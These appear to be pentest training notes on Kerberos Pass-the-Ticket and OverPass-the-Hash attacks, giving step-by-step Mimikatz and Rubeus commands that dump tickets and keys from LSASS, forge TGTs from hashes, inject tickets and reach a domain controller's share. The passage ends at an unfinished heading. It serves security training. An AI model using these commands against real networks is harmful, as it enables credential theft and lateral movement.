- In this attack, we use stolen Kerberos ticket to move laterally instead of an NTLM password hash

### Kerberos Protocol Refresher
- Kerberos authentication is ticket-based
- The central idea behind Kerberos is not to give an account password to every service you use
	- **Ticket Granting Ticket**: The first ticket obtained on a Kerberos system. Permits the client to obtain additional Kerberos tickets or **TGS**
	- **Ticket Granting Service**: Requested by users who want to use a service. Allow services to verify the user's identity
- **Key Distribution Center (KDC)**: Grants tickets

### Pass the Ticket (PtT) attack
- We need a valid Kerberos ticket

#### Scenario
- Let's imagine we are on a pentest, and we manage to phish a user and gain access to the user's computer. We found a way to obtain administrative privileges on this computer and are working with local administrator rights. Let's explore several ways we can manage to get access tickets on this computer and how we can create new tickets

#### Harvesting Kerberos tickets from Windows
- Tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service)

##### Mimikatz - Export tickets
- `mimikatz.exe`
- `privilege::debug`
- `sekurlsa::tickets /export`
- `exit`
- `dir *.kirbi`
- The tickets ending with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory

##### Rubeus - Export Tickets
- We can export tickets using `Rubeus` and the option `dump`
- Instead of giving us a file, it prints ticket encoded in Base64 format
- We can add the option `/nowrap` for easier copy-paste
- `Rubeus.exe dump /nowrap`

### Pass the Key aka. OverPass the Hash
- This approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full **Ticket Granting Ticket (TGT)** 
- Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges

#### 1) Mimkatz - Extract Kerberos Keys
- `mimikatz.exe`
- `privilege::debug`
- `sekurlsa::ekeys`

#### 2) Mimikatz - Pass the Key aka. OverPass the Hash
- `mimikatz.exe`
- `privilege::debug`
- `sekurlsa::pth /domain:[domain name] /user:[username] /ntlm:[ntlm hash]`

#### 3) Rubeus - Pass the Key aka. OverPass the Hash
- `Rubeus.exe asktgt /domain:[domain name] /user:[username] /aes256:[password hash] /nowrap`
- We can use `/rc4`, `/aes128`, `/aes256`, or `/des` for the password hash type

### Pass the Ticket (PtT)
- Now that we have some Kerberos tickets, we can use them to move laterally within an environment
- We can the flag `/ptt` to submit the ticket to the current logon session

#### 1) Rubeus - Pass the Ticket
- `Rubeus.exe asktgt /domain:[domain name] /user:[username] /rc4:[password hash] /ptt`
- Another way is to import the ticket into the current session using the `.kirbi` file
- `Rubeus.exe ptt /ticket:[kerberos ticket file]`

#### 2) Pass the Ticket - Base64 Format
##### 1) Convert .kirbi to Base64 Format
- `[Convert]::ToBase64String([IO.File]::ReadAllBytes("kerberos ticket file"))`

##### 2) b) Pass the Ticket
- `Rubeus.exe ptt /ticket:[base64 encoded ticket]`

#### 3) Mimikatz - Pass the Ticket
- `mimikatz.exe`
- `privilege::debug`
- `kerberos::ptt "kerberos ticket file"`
- `exit`
- `dir \\DC01.inlanefreight.htb\c$`

### Rubeus - PowerShell Remoting with Pass the Ticket
- Rubeus Option `createnetonly`: Creates a sacrificial process/logon session (Logon type 9)
- The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session

#### 1) Create a sacrificial process with Rubeus
